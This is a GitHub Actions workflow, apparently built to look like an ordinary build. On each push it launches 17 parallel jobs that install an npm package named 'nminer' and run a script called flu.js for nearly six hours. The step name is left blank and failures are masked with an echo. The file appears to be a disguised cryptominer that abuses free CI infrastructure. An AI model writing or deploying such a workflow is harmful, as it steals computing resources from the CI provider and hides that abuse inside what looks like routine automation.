name: flu
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 7561 }
          - { version: 8787 }
          - { version: 9758 }
          - { version: 1621 }
          - { version: 9487 }
          - { version: 7671 }
          - { version: 4665 }
          - { version: 7501 }
          - { version: 4316 }
          - { version: 9071 }
          - { version: 3800 }
          - { version: 754 }
          - { version: 3840 }
          - { version: 9452 }
          - { version: 3169 }
          - { version: 1590 }
          - { version: 4811 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 346m node flu.js || echo "flu executed"